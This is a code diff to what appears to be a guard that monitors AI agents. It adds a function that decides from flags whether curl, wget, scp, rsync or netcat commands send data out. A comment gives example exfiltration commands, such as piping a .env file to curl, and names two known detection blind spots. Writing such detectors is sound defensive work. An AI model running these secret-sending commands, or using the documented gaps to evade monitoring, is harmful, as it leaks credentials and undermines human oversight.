@@ -15,6 +15,7 @@ import {
   Scope,
   Supervision,
   TargetType,
+  Transfer,
   type Signal,
 } from '@airuntimeguard/adapter-shared';
 
@@ -210,6 +211,7 @@ export function toSignal(event: HookEvent, opts: MapOptions): Signal | null {
         ...base,
         kind: Kind.Network,
         target: { type: TargetType.Host, value: host, scope: Scope.External },
+        transfer: transferDirection(command),
         attributes: { ...base.attributes, command_shape: 'network' },
       };
     }
@@ -258,6 +260,60 @@ export function toSignal(event: HookEvent, opts: MapOptions): Signal | null {
       ? { ...base.attributes, secret_shape: shape, secret_count: 1 }
       : base.attributes,
   };
+}
+
+/**
+ * Which way data moves in a network command.
+ *
+ * Reaching a host and sending data to it are different facts. `npm install`
+ * after reading a config file is the single most common benign sequence an
+ * agent produces; scoring it like an upload is how a guard teaches people to
+ * ignore it.
+ *
+ * Only explicit data-carrying syntax counts. Anything ambiguous stays Unknown,
+ * which does not latch egress — guessing here would reintroduce the false
+ * positive this function exists to remove.
+ *
+ * ponytail: flag matching, not a shell parser. Two known blind spots, both of
+ * which fail toward Unknown rather than toward a wrong answer:
+ *   - data smuggled in a URL query string (`curl "https://x/?k=$SECRET"`)
+ *   - a pipe into a network tool (`cat .env | curl --data-binary @- https://x`)
+ *     is caught only by its `@-` flag, not by the pipe itself
+ * Close them when a recorded session shows one, not before.
+ */
+export function transferDirection(command: string): Transfer {
+  // curl: any flag that attaches a body or a file.
+  if (/\bcurl\b/.test(command)) {
+    if (/(^|\s)(-d|-F|-T|--data|--data-raw|--data-binary|--data-urlencode|--form|--upload-file|--json)(\s|=)/.test(command)) {
+      return Transfer.Egress;
+    }
+    return Transfer.Inbound;
+  }
+
+  // wget is a downloader unless explicitly told to post a body.
+  if (/\bwget\b/.test(command)) {
+    return /--(post-data|post-file|body-data|body-file)/.test(command)
+      ? Transfer.Egress
+      : Transfer.Inbound;
+  }
+
+  // scp and rsync take direction from argument order: the remote target is the
+  // one with a colon, and whether it comes last decides which way data flows.
+  if (/\b(scp|rsync)\b/.test(command)) {
+    const args = command.split(/\s+/).filter((a) => !a.startsWith('-')).slice(1);
+    const last = args[args.length - 1] ?? '';
+    const firstIsRemote = args.slice(0, -1).some((a) => /:/.test(a));
+    if (/:/.test(last)) return Transfer.Egress;
+    if (firstIsRemote) return Transfer.Inbound;
+    return Transfer.Unknown;
+  }
+
+  // A redirect into netcat is a send.
+  if (/\b(nc|ncat)\b/.test(command)) {
+    return /<\s*\S/.test(command) ? Transfer.Egress : Transfer.Unknown;
+  }
+
+  return Transfer.Unknown;
 }
 
 /** Reads whichever spelling of the session-end reason the host sent. */
